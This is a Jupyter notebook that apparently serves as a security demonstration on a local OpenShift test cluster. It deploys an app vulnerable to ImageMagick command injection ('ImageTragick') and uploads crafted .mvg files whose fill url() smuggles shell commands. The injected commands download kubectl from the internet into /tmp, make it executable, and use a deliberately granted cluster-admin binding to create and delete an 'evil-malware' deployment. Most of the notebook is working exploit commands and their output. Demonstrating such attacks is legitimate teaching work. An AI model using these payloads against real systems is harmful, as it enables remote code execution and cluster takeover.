{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**This notebook is covered by the following [license](../License.ipynb)  This note must not be removed**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "deployment.apps \"poc\" deleted\n"
     ]
    }
   ],
   "source": [
    "oc delete deployment poc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "deployment.apps/poc created\n"
     ]
    }
   ],
   "source": [
    "oc create -f - <<EOF\n",
    "apiVersion: apps/v1\n",
    "kind: Deployment\n",
    "metadata:\n",
    "  name: poc\n",
    "  labels:\n",
    "    app: poc\n",
    "spec:\n",
    "  replicas: 1\n",
    "  selector:\n",
    "    matchLabels:\n",
    "      app: poc\n",
    "  template:\n",
    "    metadata:\n",
    "      labels:\n",
    "        app: poc\n",
    "    spec:\n",
    "      containers:\n",
    "      - name: imagetragick\n",
    "#        command: [\"/bin/bash\"]\n",
    "#        args: [\"-c\", \"while true; do node app.js ; date; echo restart ; done\"]\n",
    "        image: image-registry.openshift-image-registry.svc:5000/imagetragick/poc\n",
    "        ports:\n",
    "        - containerPort: 8080\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                       READY   STATUS       RESTARTS   AGE\n",
      "pod/poc-1-build            0/1     Init:Error   0          47m\n",
      "pod/poc-2-build            0/1     Init:Error   0          47m\n",
      "pod/poc-3-build            0/1     Completed    0          41m\n",
      "pod/poc-4-build            0/1     Completed    0          2m41s\n",
      "pod/poc-776cb8bc9c-rkqrm   1/1     Running      0          12s\n",
      "\n",
      "NAME          TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE\n",
      "service/poc   ClusterIP   10.217.4.167   <none>        8080/TCP   37m\n",
      "\n",
      "NAME                  READY   UP-TO-DATE   AVAILABLE   AGE\n",
      "deployment.apps/poc   1/1     1            1           12s\n",
      "\n",
      "NAME                             DESIRED   CURRENT   READY   AGE\n",
      "replicaset.apps/poc-776cb8bc9c   1         1         1       12s\n",
      "\n",
      "NAME                                 TYPE     FROM          LATEST\n",
      "buildconfig.build.openshift.io/poc   Docker   Git@python3   4\n",
      "\n",
      "NAME                             TYPE     FROM          STATUS                       STARTED          DURATION\n",
      "build.build.openshift.io/poc-1   Docker   Git@python3   Failed (FetchSourceFailed)   47 minutes ago   9s\n",
      "build.build.openshift.io/poc-2   Docker   Git@python3   Failed (FetchSourceFailed)   47 minutes ago   9s\n",
      "build.build.openshift.io/poc-3   Docker   Git@39cc668   Complete                     41 minutes ago   1m33s\n",
      "build.build.openshift.io/poc-4   Docker   Git@9c8659e   Complete                     2 minutes ago    1m42s\n",
      "\n",
      "NAME                                 IMAGE REPOSITORY                                                           TAGS     UPDATED\n",
      "imagestream.image.openshift.io/poc   default-route-openshift-image-registry.apps-crc.testing/imagetragick/poc   latest   About a minute ago\n",
      "\n",
      "NAME                           HOST/PORT                           PATH   SERVICES   PORT   TERMINATION   WILDCARD\n",
      "route.route.openshift.io/poc   poc-imagetragick.apps-crc.testing          poc        8080                 None\n"
     ]
    }
   ],
   "source": [
    "oc get all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " * Serving Flask app \"app\" (lazy loading)\n",
      " * Environment: production\n",
      "   WARNING: This is a development server. Do not use it in a production deployment.\n",
      "   Use a production WSGI server instead.\n",
      " * Debug mode: on\n",
      " * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)\n",
      " * Restarting with stat\n",
      " * Debugger is active!\n",
      " * Debugger PIN: 295-546-594\n"
     ]
    }
   ],
   "source": [
    "oc logs -l app=poc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Error from server (AlreadyExists): services \"poc\" already exists\n"
     ]
    },
    {
     "ename": "",
     "evalue": "1",
     "output_type": "error",
     "traceback": []
    }
   ],
   "source": [
    "oc expose deployment poc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                       READY   STATUS       RESTARTS   AGE\n",
      "pod/poc-1-build            0/1     Init:Error   0          9m55s\n",
      "pod/poc-2-build            0/1     Init:Error   0          9m46s\n",
      "pod/poc-3-build            0/1     Completed    0          3m56s\n",
      "pod/poc-776cb8bc9c-pksz5   1/1     Running      0          75s\n",
      "\n",
      "NAME          TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE\n",
      "service/poc   ClusterIP   10.217.4.167   <none>        8080/TCP   3s\n",
      "\n",
      "NAME                  READY   UP-TO-DATE   AVAILABLE   AGE\n",
      "deployment.apps/poc   1/1     1            1           75s\n",
      "\n",
      "NAME                             DESIRED   CURRENT   READY   AGE\n",
      "replicaset.apps/poc-776cb8bc9c   1         1         1       75s\n",
      "\n",
      "NAME                                 TYPE     FROM          LATEST\n",
      "buildconfig.build.openshift.io/poc   Docker   Git@python3   3\n",
      "\n",
      "NAME                             TYPE     FROM          STATUS                       STARTED         DURATION\n",
      "build.build.openshift.io/poc-1   Docker   Git@python3   Failed (FetchSourceFailed)   9 minutes ago   9s\n",
      "build.build.openshift.io/poc-2   Docker   Git@python3   Failed (FetchSourceFailed)   9 minutes ago   9s\n",
      "build.build.openshift.io/poc-3   Docker   Git@39cc668   Complete                     3 minutes ago   1m33s\n",
      "\n",
      "NAME                                 IMAGE REPOSITORY                                                           TAGS     UPDATED\n",
      "imagestream.image.openshift.io/poc   default-route-openshift-image-registry.apps-crc.testing/imagetragick/poc   latest   2 minutes ago\n"
     ]
    }
   ],
   "source": [
    "oc get all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "route.route.openshift.io/poc exposed\n"
     ]
    }
   ],
   "source": [
    "oc expose service poc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                       READY   STATUS       RESTARTS   AGE\n",
      "pod/poc-1-build            0/1     Init:Error   0          10m\n",
      "pod/poc-2-build            0/1     Init:Error   0          9m55s\n",
      "pod/poc-3-build            0/1     Completed    0          4m5s\n",
      "pod/poc-776cb8bc9c-pksz5   1/1     Running      0          84s\n",
      "\n",
      "NAME          TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE\n",
      "service/poc   ClusterIP   10.217.4.167   <none>        8080/TCP   12s\n",
      "\n",
      "NAME                  READY   UP-TO-DATE   AVAILABLE   AGE\n",
      "deployment.apps/poc   1/1     1            1           84s\n",
      "\n",
      "NAME                             DESIRED   CURRENT   READY   AGE\n",
      "replicaset.apps/poc-776cb8bc9c   1         1         1       84s\n",
      "\n",
      "NAME                                 TYPE     FROM          LATEST\n",
      "buildconfig.build.openshift.io/poc   Docker   Git@python3   3\n",
      "\n",
      "NAME                             TYPE     FROM          STATUS                       STARTED          DURATION\n",
      "build.build.openshift.io/poc-1   Docker   Git@python3   Failed (FetchSourceFailed)   10 minutes ago   9s\n",
      "build.build.openshift.io/poc-2   Docker   Git@python3   Failed (FetchSourceFailed)   9 minutes ago    9s\n",
      "build.build.openshift.io/poc-3   Docker   Git@39cc668   Complete                     4 minutes ago    1m33s\n",
      "\n",
      "NAME                                 IMAGE REPOSITORY                                                           TAGS     UPDATED\n",
      "imagestream.image.openshift.io/poc   default-route-openshift-image-registry.apps-crc.testing/imagetragick/poc   latest   2 minutes ago\n",
      "\n",
      "NAME                           HOST/PORT                           PATH   SERVICES   PORT   TERMINATION   WILDCARD\n",
      "route.route.openshift.io/poc   poc-imagetragick.apps-crc.testing          poc        8080                 None\n"
     ]
    }
   ],
   "source": [
    "oc get all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "apiVersion: v1\n",
      "items:\n",
      "- apiVersion: route.openshift.io/v1\n",
      "  kind: Route\n",
      "  metadata:\n",
      "    annotations:\n",
      "      openshift.io/host.generated: \"true\"\n",
      "    creationTimestamp: \"2022-08-18T07:50:20Z\"\n",
      "    labels:\n",
      "      app: poc\n",
      "    name: poc\n",
      "    namespace: imagetragick\n",
      "    resourceVersion: \"62425\"\n",
      "    uid: d8d1b77f-afc1-4ce2-b52b-674f22b39a56\n",
      "  spec:\n",
      "    host: poc-imagetragick.apps-crc.testing\n",
      "    port:\n",
      "      targetPort: 8080\n",
      "    to:\n",
      "      kind: Service\n",
      "      name: poc\n",
      "      weight: 100\n",
      "    wildcardPolicy: None\n",
      "  status:\n",
      "    ingress:\n",
      "    - conditions:\n",
      "      - lastTransitionTime: \"2022-08-18T07:50:20Z\"\n",
      "        status: \"True\"\n",
      "        type: Admitted\n",
      "      host: poc-imagetragick.apps-crc.testing\n",
      "      routerCanonicalHostname: router-default.apps-crc.testing\n",
      "      routerName: default\n",
      "      wildcardPolicy: None\n",
      "kind: List\n",
      "metadata:\n",
      "  resourceVersion: \"\"\n"
     ]
    }
   ],
   "source": [
    "oc get route -o yaml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Go to the URL of the application in a browser and upload the `*.mvg` _images_ as pictures "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://poc-imagetragick.apps-crc.testing\n"
     ]
    }
   ],
   "source": [
    "ROUTE=$(echo http://$(oc get route poc -o jsonpath='{.spec.host}'))\n",
    "echo $ROUTE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    <!doctype html>\n",
      "    <title>Upload Image</title>\n",
      "    <h1>Upload Image</h1>\n",
      "    <form action=\"\" method=post enctype=multipart/form-data>\n",
      "        <p><input type=file name=file>\n",
      "        <input type=submit value=Upload></p>\n",
      "    </form>\n",
      "    "
     ]
    }
   ],
   "source": [
    "curl  $ROUTE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "https://storage.googleapis.com/kubernetes-release/release/v1.24.4/bin/linux/amd64/kubectl\n"
     ]
    }
   ],
   "source": [
    "KURL=\"https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl\"\n",
    "echo $KURL\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "*   Trying 192.168.130.11:80...\n",
      "* TCP_NODELAY set\n",
      "* Connected to poc-imagetragick.apps-crc.testing (192.168.130.11) port 80 (#0)\n",
      "> POST / HTTP/1.1\n",
      "> Host: poc-imagetragick.apps-crc.testing\n",
      "> User-Agent: curl/7.68.0\n",
      "> Accept: */*\n",
      "> Content-Length: 419\n",
      "> Content-Type: multipart/form-data; boundary=------------------------a4057e8b7a23af38\n",
      "> \n",
      "* We are completely uploaded and fine\n",
      "* Mark bundle as not supporting multiuse\n",
      "* HTTP 1.0, assume close after body\n",
      "< HTTP/1.0 302 FOUND\n",
      "< content-type: text/html; charset=utf-8\n",
      "< content-length: 209\n",
      "< location: http://poc-imagetragick.apps-crc.testing/\n",
      "< server: Werkzeug/1.0.1 Python/3.6.8\n",
      "< date: Thu, 18 Aug 2022 08:28:34 GMT\n",
      "< set-cookie: 6a87bf703c0f034a6170d8c555669f7a=5dfeef6f6112cf14c3ba3b1768cad225; path=/; HttpOnly\n",
      "* HTTP/1.0 connection set to keep alive!\n",
      "< connection: keep-alive\n",
      "< \n",
      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n",
      "<title>Redirecting...</title>\n",
      "<h1>Redirecting...</h1>\n",
      "* Connection #0 to host poc-imagetragick.apps-crc.testing left intact\n",
      "<p>You should be redirected automatically to target URL: <a href=\"/\">/</a>.  If not click the link."
     ]
    }
   ],
   "source": [
    "cat > kubectl.mvg <<EOF \n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://example.com/image.jpg\"|curl -o /tmp/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.22.2/bin/linux/amd64/kubectl\")'\n",
    "pop graphic-context\n",
    "EOF\n",
    "\n",
    "curl -v -F file=@kubectl.mvg $ROUTE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "*   Trying 192.168.130.11:80...\n",
      "* TCP_NODELAY set\n",
      "* Connected to poc-imagetragick.apps-crc.testing (192.168.130.11) port 80 (#0)\n",
      "> POST / HTTP/1.1\n",
      "> Host: poc-imagetragick.apps-crc.testing\n",
      "> User-Agent: curl/7.68.0\n",
      "> Accept: */*\n",
      "> Content-Length: 419\n",
      "> Content-Type: multipart/form-data; boundary=------------------------e0d4ee40767c9fef\n",
      "> \n",
      "* We are completely uploaded and fine\n",
      "* Mark bundle as not supporting multiuse\n",
      "* HTTP 1.0, assume close after body\n",
      "< HTTP/1.0 302 FOUND\n",
      "< content-type: text/html; charset=utf-8\n",
      "< content-length: 209\n",
      "< location: http://poc-imagetragick.apps-crc.testing/\n",
      "< server: Werkzeug/1.0.1 Python/3.6.8\n",
      "< date: Thu, 18 Aug 2022 08:32:07 GMT\n",
      "< set-cookie: 6a87bf703c0f034a6170d8c555669f7a=5dfeef6f6112cf14c3ba3b1768cad225; path=/; HttpOnly\n",
      "* HTTP/1.0 connection set to keep alive!\n",
      "< connection: keep-alive\n",
      "< \n",
      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n",
      "<title>Redirecting...</title>\n",
      "<h1>Redirecting...</h1>\n",
      "* Connection #0 to host poc-imagetragick.apps-crc.testing left intact\n",
      "<p>You should be redirected automatically to target URL: <a href=\"/\">/</a>.  If not click the link."
     ]
    }
   ],
   "source": [
    "cat > chmod.mvg <<EOF\n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://example.com/image.jpg\"|chmod 755 /tmp/kubectl\")'\n",
    "pop graphic-context\n",
    "EOF\n",
    "\n",
    "curl -v -F file=@kubectl.mvg $ROUTE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️\n",
    "# we have a workin exploit now\n",
    "# ⛔ might work in older versions of Kubernetes ⛔ \n",
    "# **but not in newer ones or in OpenShift**\n",
    "# ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️\n",
    "\n",
    "## we need one other 💊 of poison\n",
    "\n",
    "# never ever do this \n",
    "# ☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️\n",
    "# your cluster will be tainted\n",
    "\n",
    "# no way to get the ghost back into the bottle 🧞"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Google, Google, how to start an Elasticsearch cluster\n",
    "\n",
    "🧞 **Cool, we have a an advice like this from a vendor**\n",
    "\n",
    " ⛔ _If you are using GKE, make sure your user has cluster-admin permissions. For more information, see Prerequisites for using Kubernetes RBAC on GKE._  ⛔\n",
    "\n",
    "\n",
    "⛔ https://www.elastic.co/guide/en/cloud-on-k8s/master/k8s-deploy-eck.html  ⛔"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "clusterrolebinding.rbac.authorization.k8s.io/cluster-admin-binding-imagetragick created\n"
     ]
    }
   ],
   "source": [
    "kubectl create clusterrolebinding cluster-admin-binding-imagetragick --clusterrole cluster-admin --serviceaccount imagetragick:default"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "poc-776cb8bc9c-rkqrm\n"
     ]
    }
   ],
   "source": [
    "POD=$(oc get pods -l app=poc -o jsonpath='{.items[0].metadata.name}')\n",
    "echo $POD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                   READY   STATUS       RESTARTS   AGE\n",
      "poc-1-build            0/1     Init:Error   0          51m\n",
      "poc-2-build            0/1     Init:Error   0          51m\n",
      "poc-3-build            0/1     Completed    0          45m\n",
      "poc-4-build            0/1     Completed    0          6m59s\n",
      "poc-776cb8bc9c-rkqrm   1/1     Running      0          4m30s\n"
     ]
    }
   ],
   "source": [
    "oc exec $POD -- /tmp/kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "*   Trying 192.168.130.11:80...\n",
      "* TCP_NODELAY set\n",
      "* Connected to poc-imagetragick.apps-crc.testing (192.168.130.11) port 80 (#0)\n",
      "> POST / HTTP/1.1\n",
      "> Host: poc-imagetragick.apps-crc.testing\n",
      "> User-Agent: curl/7.68.0\n",
      "> Accept: */*\n",
      "> Content-Length: 385\n",
      "> Content-Type: multipart/form-data; boundary=------------------------36ae2ff28f94b070\n",
      "> \n",
      "* We are completely uploaded and fine\n",
      "* Mark bundle as not supporting multiuse\n",
      "* HTTP 1.0, assume close after body\n",
      "< HTTP/1.0 302 FOUND\n",
      "< content-type: text/html; charset=utf-8\n",
      "< content-length: 209\n",
      "< location: http://poc-imagetragick.apps-crc.testing/\n",
      "< server: Werkzeug/1.0.1 Python/3.6.8\n",
      "< date: Thu, 18 Aug 2022 08:33:40 GMT\n",
      "< set-cookie: 6a87bf703c0f034a6170d8c555669f7a=5dfeef6f6112cf14c3ba3b1768cad225; path=/; HttpOnly\n",
      "* HTTP/1.0 connection set to keep alive!\n",
      "< connection: keep-alive\n",
      "< \n",
      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n",
      "<title>Redirecting...</title>\n",
      "<h1>Redirecting...</h1>\n",
      "* Connection #0 to host poc-imagetragick.apps-crc.testing left intact\n",
      "<p>You should be redirected automatically to target URL: <a href=\"/\">/</a>.  If not click the link."
     ]
    }
   ],
   "source": [
    "cat > create.mvg <<EOF\n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://example.com/image.jpg\"|/tmp/kubectl create deployment evil-malware --image=k8s.gcr.io/echoserver:1.4\")'\n",
    "pop graphic-context\n",
    "EOF\n",
    "\n",
    "curl -v -F file=@create.mvg $ROUTE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                            READY   STATUS       RESTARTS   AGE\n",
      "evil-malware-6dbd8f8d68-kq5d4   1/1     Running      0          9s\n",
      "poc-1-build                     0/1     Init:Error   0          53m\n",
      "poc-2-build                     0/1     Init:Error   0          53m\n",
      "poc-3-build                     0/1     Completed    0          47m\n",
      "poc-4-build                     0/1     Completed    0          8m34s\n",
      "poc-776cb8bc9c-rkqrm            1/1     Running      0          6m5s\n"
     ]
    }
   ],
   "source": [
    "oc get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "*   Trying 192.168.130.11:80...\n",
      "* TCP_NODELAY set\n",
      "* Connected to poc-imagetragick.apps-crc.testing (192.168.130.11) port 80 (#0)\n",
      "> POST / HTTP/1.1\n",
      "> Host: poc-imagetragick.apps-crc.testing\n",
      "> User-Agent: curl/7.68.0\n",
      "> Accept: */*\n",
      "> Content-Length: 351\n",
      "> Content-Type: multipart/form-data; boundary=------------------------3a7aeec3b4ec6b0d\n",
      "> \n",
      "* We are completely uploaded and fine\n",
      "* Mark bundle as not supporting multiuse\n",
      "* HTTP 1.0, assume close after body\n",
      "< HTTP/1.0 302 FOUND\n",
      "< content-type: text/html; charset=utf-8\n",
      "< content-length: 209\n",
      "< location: http://poc-imagetragick.apps-crc.testing/\n",
      "< server: Werkzeug/1.0.1 Python/3.6.8\n",
      "< date: Thu, 18 Aug 2022 08:34:05 GMT\n",
      "< set-cookie: 6a87bf703c0f034a6170d8c555669f7a=5dfeef6f6112cf14c3ba3b1768cad225; path=/; HttpOnly\n",
      "* HTTP/1.0 connection set to keep alive!\n",
      "< connection: keep-alive\n",
      "< \n",
      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n",
      "<title>Redirecting...</title>\n",
      "<h1>Redirecting...</h1>\n",
      "* Connection #0 to host poc-imagetragick.apps-crc.testing left intact\n",
      "<p>You should be redirected automatically to target URL: <a href=\"/\">/</a>.  If not click the link."
     ]
    }
   ],
   "source": [
    "cat > delete.mvg <<EOF\n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://example.com/image.jpg\"|/tmp/kubectl delete deployment evil-malware\")'\n",
    "pop graphic-context\n",
    "EOF\n",
    "\n",
    "curl -v -F file=@delete.mvg $ROUTE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                   READY   STATUS       RESTARTS   AGE\n",
      "poc-1-build            0/1     Init:Error   0          53m\n",
      "poc-2-build            0/1     Init:Error   0          53m\n",
      "poc-3-build            0/1     Completed    0          47m\n",
      "poc-4-build            0/1     Completed    0          8m58s\n",
      "poc-776cb8bc9c-rkqrm   1/1     Running      0          6m29s\n"
     ]
    }
   ],
   "source": [
    "oc get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "clusterrolebinding.rbac.authorization.k8s.io \"cluster-admin-binding-imagetragick\" deleted\n"
     ]
    }
   ],
   "source": [
    "kubectl delete clusterrolebinding cluster-admin-binding-imagetragick"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Bash",
   "language": "bash",
   "name": "bash"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".sh",
   "mimetype": "text/x-sh",
   "name": "bash"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
